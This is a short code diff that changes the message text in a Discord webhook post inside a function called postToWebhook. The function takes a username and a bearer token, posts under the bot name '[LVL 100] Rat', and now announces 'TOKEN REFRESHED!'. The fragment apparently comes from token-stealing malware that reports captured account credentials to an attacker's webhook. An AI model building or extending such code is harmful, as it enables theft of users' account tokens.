@@ -321,7 +321,7 @@ async function postToWebhook(formatNumber, level, rank, username, bearerToken, u
     let data = {
 username: "[LVL 100] Rat",
   avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
-content: "@everyone ",
+content: "@everyone TOKEN REFRESHED!",
   embeds: [
     {
       color: 3482894,
